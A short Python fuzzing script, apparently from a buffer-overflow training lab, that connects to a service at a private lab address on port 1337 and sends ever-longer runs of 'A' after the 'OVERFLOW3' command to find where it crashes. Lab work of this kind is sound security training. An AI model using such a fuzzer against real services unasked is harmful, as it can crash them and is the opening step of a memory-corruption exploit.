import socket 

IP = "10.10.206.209"
PORT = 1337

s = socket.socket()
s.connect((IP,PORT))
s.recv(1024)

prefix = b"OVERFLOW3 "
buffer = [
    prefix,
    b"A"*100
]
buffer = b"".join(buffer)

while True:
    s.send(buffer)
    buffer = buffer + b"A"*100